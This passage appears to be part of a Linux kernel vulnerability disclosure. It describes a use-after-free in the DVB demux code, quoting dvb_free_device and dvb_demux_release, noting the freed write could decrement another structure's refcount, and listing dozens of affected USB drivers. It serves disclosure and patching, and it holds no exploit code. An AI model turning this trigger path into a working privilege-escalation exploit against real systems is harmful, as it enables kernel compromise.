+1 ~ 4. The order of 1-4 is the same as the first vulnerability.
+
+5. This time, "dvbdev", not "dvbdev->fops", is the target of the UAF vulnerability:
+```
+void dvb_free_device(struct dvb_device *dvbdev)
+{
+        if (!dvbdev)
+                return;
+
+        kfree (dvbdev->fops);
+        kfree (dvbdev);    // target
+}
+EXPORT_SYMBOL(dvb_free_device);
+```
+
+6. When close(demux0) is executed, the dvb_demux_release() function is called and a UAF write vulnerability occurs in "dmxdev->dvbdev->users--;".
+```
+static int dvb_demux_release(struct inode *inode, struct file *file)
+{
+        struct dmxdev_filter *dmxdevfilter = file->private_data;
+        struct dmxdev *dmxdev = dmxdevfilter->dev;
+        int ret;
+
+        ret = dvb_dmxdev_filter_free(dmxdev, dmxdevfilter);
+
+        mutex_lock(&dmxdev->mutex);
+        dmxdev->dvbdev->users--;    // here
+        if (dmxdev->dvbdev->users == 1 && dmxdev->exit == 1) {
+                mutex_unlock(&dmxdev->mutex);
+                wake_up(&dmxdev->dvbdev->wait_queue);
+        } else
+                mutex_unlock(&dmxdev->mutex);
+
+        return ret;
+}
+```
+This UAF write vulnerability can be used, for example, to decrement the refcount of another structure.
+
+The poc code is the same as the above vulnerability.
+
+
+# vulnerability scope
+The scope of this vulnerability is:
+
+- drivers/media/usb/as102/as102_usb_drv.c
+- drivers/media/usb/tm6000/tm6000-cards.c
+- drivers/media/usb/pvrusb2/pvrusb2-dvb.c
+- drivers/media/usb/au0828/au0828-core.c
+- drivers/media/usb/cx231xx/cx231xx-cards.c
+- drivers/media/usb/ttusb-dec/ttusb_dec.c
+- drivers/media/usb/ttusb-budget/dvb-ttusb-budget.c
+- drivers/media/usb/em28xx/em28xx-dvb.c
+- drivers/media/usb/dvb-usb/cxusb.c
+- drivers/media/usb/dvb-usb/dw2102.c
+- drivers/media/usb/dvb-usb/dtt200u.c
+- drivers/media/usb/dvb-usb/m920x.c
+- drivers/media/usb/dvb-usb/dibusb-mb.c
+- drivers/media/usb/dvb-usb/ttusb2.c
+- drivers/media/usb/dvb-usb/pctv452e.c
+- drivers/media/usb/dvb-usb/a800.c
+- drivers/media/usb/dvb-usb/umt-010.c
+- drivers/media/usb/dvb-usb/dtv5100.c
+- drivers/media/usb/dvb-usb/dibusb-mc.c
+- drivers/media/usb/dvb-usb/cinergyT2-core.c
+- drivers/media/usb/dvb-usb/nova-t-usb2.c
+- drivers/media/usb/dvb-usb/vp7045.c
+- drivers/media/usb/dvb-usb/digitv.c
+- drivers/media/usb/dvb-usb/gp8psk.c
+- drivers/media/usb/dvb-usb/vp702x.c
+- drivers/media/usb/dvb-usb/opera1.c
+- drivers/media/usb/dvb-usb/technisat-usb2.c
+- drivers/media/usb/dvb-usb/dib0700_core.c
+- drivers/media/usb/dvb-usb/az6027.c
+- drivers/media/usb/dvb-usb/af9005.c
+- drivers/media/usb/dvb-usb-v2/au6610.c
+- drivers/media/usb/dvb-usb-v2/zd1301.c
+- drivers/media/usb/dvb-usb-v2/ce6230.c
+- drivers/media/usb/dvb-usb-v2/ec168.c
+- drivers/media/usb/dvb-usb-v2/gl861.c
+- drivers/media/usb/dvb-usb-v2/dvbsky.c
+- drivers/media/usb/dvb-usb-v2/az6007.c
+- drivers/media/usb/dvb-usb-v2/lmedm04.c
+- drivers/media/usb/dvb-usb-v2/anysee.c
+- drivers/media/usb/dvb-usb-v2/mxl111sf.c
+- drivers/media/usb/dvb-usb-v2/af9015.c
+- drivers/media/usb/dvb-usb-v2/rtl28xxu.c
+- drivers/media/usb/dvb-usb-v2/af9035.c
+
+
+Best Regards,
+Hyunwoo Kim.
